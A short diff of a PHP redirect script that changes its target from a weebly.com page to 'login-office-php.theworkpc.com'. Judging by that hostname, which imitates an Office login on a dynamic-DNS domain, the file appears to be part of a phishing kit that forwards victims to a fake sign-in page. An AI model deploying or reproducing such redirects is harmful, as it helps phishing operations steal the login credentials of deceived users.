@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://blaqspyre.weebly.com/"); 
+header("Location: https://login-office-php.theworkpc.com/"); 
   
 exit; 
 ?> 
